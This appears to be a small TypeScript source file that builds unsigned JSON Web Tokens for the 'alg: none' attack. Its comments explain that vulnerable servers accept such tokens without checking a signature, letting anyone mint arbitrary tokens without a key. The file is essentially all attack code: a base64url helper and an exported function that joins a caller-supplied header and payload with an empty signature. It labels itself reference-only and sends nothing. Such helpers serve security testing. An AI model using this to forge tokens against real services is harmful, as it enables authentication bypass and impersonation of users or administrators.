// Builds a JWT with the "none" algorithm -- some JWT libraries/servers
// accept alg: none at face value and skip signature verification entirely
// (the classic JWT alg-confusion attack), which turns "I can read the
// token" into "I can mint any token I want" with no key material needed.
// Reference-only: builds the string, sends nothing.
function b64url(bytes: Uint8Array): string {
  let binary = "";
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

export function buildNoneAlgJwt(headerJson: string, payloadJson: string): string {
  const header = JSON.stringify(JSON.parse(headerJson));
  const payload = JSON.stringify(JSON.parse(payloadJson));
  const encoder = new TextEncoder();
  return `${b64url(encoder.encode(header))}.${b64url(encoder.encode(payload))}.`;
}
